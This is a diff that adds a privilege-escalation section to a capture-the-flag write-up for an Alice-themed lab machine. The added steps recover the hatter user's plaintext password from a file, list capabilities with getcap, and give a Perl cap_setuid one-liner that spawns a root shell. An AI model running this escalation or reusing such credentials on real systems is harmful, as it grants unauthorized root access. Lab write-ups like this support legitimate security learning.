@@ -150,5 +150,35 @@ cd /home/rabbit
 
 have a shell with as hatter user but this is also not high permision
 
+![img](Screenshots/fvf)
+
+go to path "/home/hatter" and see file and directry, I'm finding a file with name "password.txt" it cotain a password of hatter user
+password = "WhyIsARavenLikeAWritingDesk?"
+
+![img](Screenshots/fvf)
+
+try by 
+
+```bash
+sudo -l
+getcap -r / 2>/dev/null
+```
+
+![img](Screenshots/fvf)
+
+result have two service with "cap_setuid+ep" can use it 
+we will exploit by the "/usr/bin/perl"
+
+```bash
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+```
+
+if get "bash: /usr/bin/perl: Permission denied"
+
+![img](Screenshots/fvf)
+
+reconnect by ssh as user hatter (password we found)
+
+
 
 ---
